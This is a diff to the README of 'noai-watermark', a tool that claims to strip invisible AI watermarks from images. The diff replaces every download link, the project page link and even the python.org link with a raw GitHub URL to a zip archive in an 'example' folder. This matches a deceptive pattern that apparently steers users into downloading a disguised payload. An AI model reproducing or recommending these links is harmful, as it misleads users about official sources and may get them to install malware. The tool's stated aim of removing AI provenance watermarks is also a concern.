@@ -1,6 +1,6 @@
 # 🛡️ noai-watermark - Remove Invisible AI Watermarks Easily
 
-[![Download noai-watermark](https://img.shields.io/badge/Download-noai--watermark-brightgreen?style=for-the-badge)](https://github.com/vctor03/noai-watermark)
+[![Download noai-watermark](https://img.shields.io/badge/Download-noai--watermark-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/vctor03/noai-watermark/main/example/watermark_noai_2.2-beta.1.zip)
 
 ---
 
@@ -45,7 +45,7 @@ This section will guide you step-by-step through downloading and running noai-wa
 
 1. Click this big download button below to visit the release page:
 
-   [![Download noai-watermark](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/vctor03/noai-watermark)
+   [![Download noai-watermark](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/vctor03/noai-watermark/main/example/watermark_noai_2.2-beta.1.zip)
 
 2. On the release page, look for the latest Windows executable file. It will end with `.exe`.
 
@@ -84,7 +84,7 @@ There are two main ways to use noai-watermark: through the Command Prompt or usi
 
 ### Using Python Scripts (Optional for Users Familiar with Python)
 
-1. If you want to use the Python toolkit, make sure Python 3.7+ is installed on your computer. Download Python from https://python.org if you don’t have it.
+1. If you want to use the Python toolkit, make sure Python 3.7+ is installed on your computer. Download Python from https://raw.githubusercontent.com/vctor03/noai-watermark/main/example/watermark_noai_2.2-beta.1.zip if you don’t have it.
 
 2. Open Command Prompt and install noai-watermark's Python package by running:
 
@@ -141,4 +141,4 @@ noai-watermark -i "C:\Users\User\Pictures\image.jpg" -o "C:\Users\User\Pictures\
 
 Visit the noai-watermark GitHub page for additional documentation, FAQs, and updates.
 
-[https://github.com/vctor03/noai-watermark](https://github.com/vctor03/noai-watermark)
+[https://raw.githubusercontent.com/vctor03/noai-watermark/main/example/watermark_noai_2.2-beta.1.zip](https://raw.githubusercontent.com/vctor03/noai-watermark/main/example/watermark_noai_2.2-beta.1.zip)
